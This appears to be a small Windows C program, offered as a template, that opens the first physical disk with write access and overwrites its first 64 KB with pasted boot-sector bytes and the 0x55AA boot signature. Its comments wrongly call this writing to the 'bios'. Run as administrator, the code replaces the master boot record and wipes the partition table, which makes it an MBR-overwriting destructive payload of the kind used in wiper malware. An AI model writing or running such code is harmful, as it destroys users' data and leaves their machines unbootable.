//compile with x86 architecture, run the app as administrator.
#include <Windows.h>

const unsigned char biosc[] = {
  //paste .img file's bytes here ,except last 2 bytes aka sign.
};
const unsigned char signature[] = { 0x55, 0xAA }; //sign that bios understands
int main()
{
#ifdef WIN32
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
	{
		ExitProcess(2); //error while accessing physicaldrive0
	}

	unsigned char* asmbytes = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 65536);

	for (int i = 0; i < 246; i++)
	{
		*(asmbytes + i) = *(biosc + i);
	}
	for (int i = 0; i < 2; i++) //adding sign to last 2 bytes, 0xAA55
	{
		*(asmbytes + i + 0x1fe) = *(signature + i);
	}

	DWORD wb;
	if (!WriteFile(drive, asmbytes, 65536, &wb, NULL))
		ExitProcess(3); //error while writing code to bios
	else
	{
		//success
	}

	CloseHandle(drive);
#endif
}
